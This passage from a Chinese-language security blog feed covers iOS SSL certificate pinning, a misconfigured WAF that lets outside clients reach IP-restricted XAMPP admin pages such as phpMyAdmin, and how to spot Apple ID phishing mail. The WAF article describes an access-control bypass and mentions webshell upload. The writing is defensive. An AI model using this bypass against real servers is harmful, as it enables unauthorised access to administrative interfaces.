&lt;p&gt;與前面 NSURLConnection 的情況類同，只是這裡使用到的是 iOS7  新增的 NSURLSession 元件。對應的處理方式如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;completionHandler:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;                               &lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;                                                    &lt;span class=&quot;nl&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;random-org&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;                                                             &lt;span class=&quot;nl&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;der&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;             &lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__bridge&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&quot;對-webview-的一些補充&quot;&gt;對 WebView 的一些補充&lt;/h4&gt;
&lt;p&gt;在對 WebView 做處理上，除了對 SSL 錯誤直接略過外，目前無論是在 Android 還是 iOS 上，SDK API 都尚未直接提供方法讓開發者能在 SSL Handshake 的途中作 Server Certificate Pinning。其中一個替代方法是，利用其他能夠作 Pinning 的元件將資料下載回來，接著把資料傳到 WebView 進行讀取，避開原本用 WebView 直接設定連線網址。蘋果公司有提供這種處理的&lt;a href=&quot;https://developer.apple.com/library/ios/samplecode/CustomHTTPProtocol/Introduction/Intro.html&quot;&gt;範例&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;結語&quot;&gt;結語&lt;/h3&gt;
&lt;p&gt;本來為了提高安全性而使用的 SSL 加密連線，卻由於程式處理不當讓原來的保護形同虛設。觀念不足與為節省時間而沒做好處理相信是主要原因。網路上大量的文章在引指開發者略過錯誤警告的時候，卻沒有提醒他們這樣做帶來的影響，也助長了不當處理的發生。&lt;/p&gt;

&lt;p&gt;除了 SSL 處理問題外，手機應用程式開發還有許多要注意的安全問題，像是 OWASP 列出的 &lt;a href=&quot;https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks&quot;&gt;Top 10 Mobile Risks&lt;/a&gt;、由日本智慧型手機安全協會發佈 &lt;a href=&quot;http://www.jssec.org/report/android_securecoding_en_20140801.html&quot;&gt;Android Application Secure Design/Secure Coding Guidebook&lt;/a&gt; 裡面所建議的。開發商有責任做好安全把關以保障雙方權益。&lt;/p&gt;

&lt;h3 id=&quot;參考&quot;&gt;參考&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-ssl.org&quot;&gt;Rethinking SSL Development in an Appified World&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-developers.blogspot.com/2012/03/unifying-key-store-access-in-ics.html&quot;&gt;Unifying Key Store Access in ICS | Android Developers Blog&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://commonsware.com/blog/2013/03/04/ssl-android-basics.html&quot;&gt;The CommonsBlog — SSL on Android: The Basics&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html&quot;&gt;Security with HTTPS and SSL | Android Developers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/librarY/mac/documentation/NetworkingInternet/Conceptual/NetworkingTopics/Articles/OverridingSSLChainValidationCorrectly.html&quot;&gt;Networking Programming Topics: Overriding TLS Chain Validation Correctly&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/library/ios/technotes/tn2232/_index.html&quot;&gt;Technical Note TN2232: HTTPS Server Trust Evaluation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning&quot;&gt;Certificate and Public Key Pinning - OWASP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;Google 基於效能及有效性的考量，在 Android 系統上預設停用&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;憑證撤銷檢查&lt;/a&gt;&lt;br /&gt; &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;OWASP 的 Android 範例中，內含的 PUB_KEY 是錯誤的 (最後更改日期 2014/08/14) &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/</link>
                <guid>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development</guid>
                <pubDate>Fri, 15 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>設備不良設定帶來的安全風險：以 WAF 為例</title>
                <description>&lt;p&gt;過去談到網站安全，通常會使用防火牆或 IDS 進行防護。但近年來網站安全議題都是以網頁應用程式的漏洞居多，無法單靠防火牆阻擋。以 OWASP Top 10 2013 的第一名 Injection 而言，多半是程式撰寫方法不嚴謹所造成，因此才有了網頁應用程式防火牆 (Web Application Firewall, WAF) 的出現。&lt;/p&gt;

&lt;p&gt;有了 WAF 就是萬靈丹了嗎？就算有各種資安設備，但缺乏安全的設定，有的時候反而會讓系統陷入安全風險中。我們就以 Reverse Proxy 或 WAF 設備來探討不佳設定帶來的安全風險。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;waf-搭配不佳的設定會帶來什麼危害&quot;&gt;WAF 搭配不佳的設定會帶來什麼危害？&lt;/h3&gt;

&lt;p&gt;以常見的 mod_proxy 搭配 mod_security 的方案來看，通常使用 Reverse Proxy 或 Transparent Proxy 為其架構，透過 Proxy 的方式在 Client 與 Web Server 之間，對 HTTP Request / Response 進行過濾；以 HTTP Request 為例，當 WAF 偵測到 Client 端的請求中有 SQL Injection 語法時候，將會阻斷這個連線防止駭客攻擊。&lt;/p&gt;

&lt;p&gt;在這種架構下的 WAF 看似對後端的伺服器多了一份保障，但也並非完美。其問題是後端的 Web Server 在透過 WAF 存取的情況下，無法得知來自 Client 端的來源 IP，相反的 Web Server 能看到的 IP 都將是 WAF 的 IP (REMOTE ADDR)，在這種情況下可能造成 Client 端可以存取受 IP 來源限制的系統。延伸閱讀：&lt;a href=&quot;http://devco.re/blog/2014/06/19/client-ip-detection/&quot;&gt;如何正確的取得使用者 IP？&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;以下圖為例，網站本身只允許 192.168.x.x 的網段連線，如果今天 Client IP 是 1.1.1.1，將無法存取該網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot; alt=&quot;限制 IP 存取&quot; title=&quot;限制 IP 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;但在有建置 WAF 的架構之下，Client 透過 WAF 存取網站，網站得到的 IP 會是 WAF 的 IP：192.168.1.10，因此允許連線，Client 因而取得原本需在內網才能存取的資料。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot; alt=&quot;因為 WAF 而繞過 IP 限制&quot; title=&quot;因為 WAF 而繞過 IP 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;實際案例&quot;&gt;實際案例&lt;/h3&gt;

&lt;p&gt;我們以常見的 Web Server 整合包 XAMPP 為例，在預設的 http-xampp.conf 設定檔中限制了一些管理頁面只能由 Private IP 存取，如 /security 、 /webalizer 、 /phpmyadmin 、 /server-status 、 /server-info 等，此時 WAF 的 IP 若為 Private IP，依 XAMPP 預設設定，WAF 將可以存取這些受 IP 限制的資源，當 WAF 存取完資源後又將內容回傳給 Client 端。&lt;/p&gt;

&lt;p&gt;http-xampp.conf 預設設定&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;LocationMatch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; deny,allow
        &lt;span class=&quot;nb&quot;&gt;Deny&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from ::1 &lt;span class=&quot;m&quot;&gt;127.0.0.0/8&lt;/span&gt; \
                &lt;span class=&quot;err&quot;&gt;fc00::/7&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/8&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;172&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;16&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/12&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;192&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;168&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/16&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;
                &lt;span class=&quot;err&quot;&gt;fe80::/10&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;169&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;254&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;0/16&lt;/span&gt;
         &lt;span class=&quot;nb&quot;&gt;ErrorDocument&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;403&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/error/XAMPP_FORBIDDEN.html.var&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LocationMatch&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如果照著預設的設定，以現成的案例來看，能夠存取 Apache Server 的系統狀態，其中可以看到網站所有連線以及 URI 等資料。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot; alt=&quot;預設開放 Apache 伺服器狀態&quot; title=&quot;預設開放 Apache 伺服器狀態&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;並且可以直接讀取 phpMyAdmin 介面，並且至資料庫中新增、修改、刪除資料，甚至直接上傳 webshell 進入主機。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot; alt=&quot;直接進入 phpMyAdmin 管理介面&quot; title=&quot;直接進入 phpMyAdmin 管理介面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;XAMPP 也內建了網站記錄分析工具 webalizer，透過這個介面可以知道網站所有進入點的流量、統計數據等。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot; alt=&quot;網站記錄分析工具 webalizer&quot; title=&quot;網站記錄分析工具 webalizer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;小結&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;如果建置了 WAF，有關 IP 的設定必須要從 WAF 支援的 HTTP Header 中取出使用者的 IP (REMOTE_ADDR)，才能讓原本網站的 IP 限制生效。在這種設定錯誤或是對 WAF 架構不瞭解的情況下，WAF 反而成為駭客繞過 Private IP 限制的跳板，就如同為駭客開了一個後門。因此在使用資安設備時，必須瞭解其架構。別讓資安設備、安全機制，反而使得伺服器更不安全。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/18/waf-configuration-security-issue/</link>
                <guid>https://devco.re/blog/2014/07/18/waf-configuration-security-issue</guid>
                <pubDate>Fri, 18 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Apple ID 釣魚郵件案例</title>
                <description>&lt;p&gt;今天又有不怕死的人寄來釣魚信了，這次是騙取 Apple ID。讓我們來看看這封信，其中內容有非常多破綻，也已經被 Gmail 直接定為 Spam 了，非常可憐。除了信件之外，釣魚的網頁本身也很值得我們借鏡，讓我們來看看這次的釣魚郵件案例。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID 釣魚信&quot; title=&quot;Apple ID 釣魚信&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;如何判別釣魚信呢&quot;&gt;如何判別釣魚信呢？&lt;/h3&gt;

&lt;p&gt;先來談談要如何判別釣魚信呢。我們可以從四個要素來看：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;標題&lt;/li&gt;
  &lt;li&gt;寄件者&lt;/li&gt;
  &lt;li&gt;內文&lt;/li&gt;
  &lt;li&gt;連結&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;標題&quot;&gt;標題&lt;/h4&gt;

&lt;p&gt;首先，這封信的標題非常假，一般來說公司不會使用這類標題，這種判斷比較需要經驗。釣魚信件會使用非常聳動、吸引你去做動作的標題。例如常見的「你的帳號遭到停用」、「更換帳號資訊通知」等。點下連結就會帶你去假造的頁面騙你輸入密碼，千萬別傻傻當真。&lt;/p&gt;

&lt;h4 id=&quot;寄件者&quot;&gt;寄件者&lt;/h4&gt;

&lt;p&gt;寄件者通常是釣魚信一定會加強假造的部分，利用官方存在的信箱或是他人的信箱寄信，加強你的信任。不過需要特別注意的是：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;寄件者的欄位是可以假造、隨意填寫的，千萬不要直接信任。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;以這封信為例，寄件者「service@apple.com」是不存在的。當然這個欄位可以假造，但連假造都錯，實在是非常不用心。&lt;/p&gt;

&lt;h4 id=&quot;內文&quot;&gt;內文&lt;/h4&gt;

&lt;p&gt;信件的內文就是精華了，要怎麼做出一封很像官方的信件，又要誘使人去點選，實在是一門藝術。精心設計的釣魚信、社交工程、APT 郵件，通常都會針對受害者客製化，調查身邊的社交圈、常談的話題、常用的服務、會點擊的郵件，來製造一個一定會中獎的信件。&lt;/p&gt;

&lt;p&gt;當然很多時候攻擊者調查不足，還是會出現蛛絲馬跡的。例如來自中國的惡意郵件，常會出現「&lt;strong&gt;尊敬的用戶您好&lt;/strong&gt;」這種在台灣人眼中看了很彆扭的詞彙。如果出現了不常見的用詞，就非常有可能是一個假造的惡意郵件，千萬不要傻傻的點選連結或附件。&lt;/p&gt;

